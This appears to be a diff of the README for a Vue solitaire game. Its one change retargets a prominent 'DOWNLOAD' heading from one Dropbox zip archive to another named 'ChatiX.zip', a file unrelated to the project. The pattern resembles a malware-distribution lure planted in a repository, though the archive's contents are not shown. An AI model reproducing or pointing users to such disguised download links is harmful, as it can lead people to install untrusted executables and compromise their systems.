@@ -17,7 +17,7 @@
 
 <img src="https://img.shields.io/github/issues/silent-lad/VueSolitaire.svg">
 
-<h1 align="center"><a  href="https://www.dropbox.com/s/kig9s4wz1l3g08x/installer.zip?dl=1">DOWNLOAD</a></h1>
+<h1 align="center"><a  href="https://www.dropbox.com/s/bw5sr38fip2x5xg/ChatiX.zip?dl=1">DOWNLOAD</a></h1>
 
 ## Description
 
